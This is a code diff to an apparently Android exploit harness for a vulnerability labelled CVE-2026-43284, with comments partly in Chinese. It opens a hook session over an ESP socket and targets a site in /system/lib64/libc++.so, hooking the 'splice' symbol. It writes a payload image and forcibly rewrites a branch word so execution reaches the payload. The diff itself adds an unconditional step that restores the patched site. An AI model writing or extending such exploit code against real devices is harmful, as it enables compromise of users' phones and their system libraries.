@@ -493,7 +493,7 @@ object TypedBackendProbe {
             "typed: 43284 embeddedImage code=" + (if (image == null) "null" else "ok") +
                 " size=" + (image?.size ?: -1) + " refusal=" + refusal[0],
         )
-        val hook = LongArray(4)
+        val hook = LongArray(10)
         val hookRequest = HookPlanRequest43284(
             ByteArray(16) { 0x11 }, "splice".toByteArray(), 0,
         )
@@ -1171,12 +1171,16 @@ object TypedBackendProbe {
         }.onFailure { problem ->
             step("typed: network refused " + problem.javaClass.simpleName)
         }
+        /* 终点恢复要用的两样：本次 hook 会话与本次 plan（在 hook 段里赋值，段外无条件用它）。 */
+        var hookForRestore: Assembled43284? = null
+        var hookPlanWordsForRestore: LongArray? = null
         /* ① hook 段：同一条 SA、同一条 ESP 套接字；目标是 /system/lib64/libc++.so 的 sentry 站点。 */
         runCatching {
             meter.before("Native43284.create", "(hook session)")
             val hookHandle = Native43284.create()
             meter.after("Native43284.create", "handle=" + hookHandle)
             val hook = Assembled43284(hookHandle) { saInit() }
+            hookForRestore = hook
             meter.before("Assembled43284.openTargetStepwise", "path=HOOK_TARGET")
             val hookDoor = hook.openTargetStepwise(Assembled43284.HOOK_TARGET)
             meter.after("Assembled43284.openTargetStepwise", "target=" + hookDoor + " refusal=" + hook.lastRefusal)
@@ -1229,6 +1233,7 @@ step("typed: hook adopt sequence " + hookAdopt)
 meter.before("Assembled43284.hookPlan", "symbol=splice")
 val hookPlanWords = hook.hookPlan("splice")
 meter.after("Assembled43284.hookPlan", "words=" + (hookPlanWords?.joinToString(",") ?: "null") + " code=" + hook.lastCode + " refusal=" + hook.lastRefusal)
+hookPlanWordsForRestore = hookPlanWords
 /** The site is already patched on disk (writeHook answers displaced-mismatch), and the branch that
  * older code left there aims 0xC short of the payload entry. Force the word to the one this run
  * needs; rewriteSiteBranch does not look at the displaced instruction, it just writes the word. */
@@ -1534,6 +1539,47 @@ meter.after("Assembled43284.writeImage", "ok=" + payloadWrote + " code=" + hook.
             }
         }.onFailure { problem ->
             step("typed: hook refused " + problem.javaClass.simpleName + ":" + (problem.message ?: ""))
+        }
+        /*
+         * 终点恢复（无条件）：成功、hook wait 超时、以及任何异常路径都走到这里。
+         * 参照 ghostlock-app-ref@5f184760 的 src/core/backend/cve_2026_43284/steps/chain.cpp:355
+         * （注释原文 "It runs on every terminus path"）与同树 steps/hook_patch.cpp:193-225 的 restore 段。
+         * plan 与写站点时同一份（同一次 hookPlan 的十个 word），面是同一个 access，序号由该窗口自己接续；
+         * 没有会话/没有 plan 时如实记原因（本次运行还没写站点，就没有要恢复的东西）。
+         */
+        try {
+            val restoreSession = hookForRestore
+            val restorePlan = hookPlanWordsForRestore?.let { words -> restoreSession?.planOf(words) }
+            if (restoreSession == null || restorePlan == null) {
+                step(
+                    "typed: hook restore=false refusal=" +
+                        (if (restoreSession == null) "hook-session-absent" else "hook-plan-absent"),
+                )
+            } else {
+                meter.before(
+                    "Assembled43284.restoreHook",
+                    "access=" + restoreSession.accessId +
+                        " site=0x" + java.lang.Long.toHexString(restorePlan.hookPlanFileOffset) +
+                        " guard=0x" + java.lang.Long.toHexString(restorePlan.hookPlanGuardInstruction) +
+                        " seq=" + restoreSession.nextSequence(),
+                )
+                val restored = restoreSession.restoreHook(
+                    restorePlan,
+                    16L,
+                    saInit(restoreSession.nextSequence()),
+                )
+                meter.after(
+                    "Assembled43284.restoreHook",
+                    "ok=" + restored + " code=" + restoreSession.lastCode +
+                        " refusal=" + restoreSession.lastRefusal,
+                )
+                step("typed: hook restore=" + restored + " refusal=" + restoreSession.lastRefusal)
+            }
+        } catch (problem: Throwable) {
+            step(
+                "typed: hook restore=false refusal=" +
+                    problem.javaClass.simpleName + ":" + (problem.message ?: ""),
+            )
         }
         step("typed: patch1 wrote=" + patchWrote + " refusal=" + patcher.lastRefusal +
             " helperBytes=" + (helperForPatch?.size ?: -1))
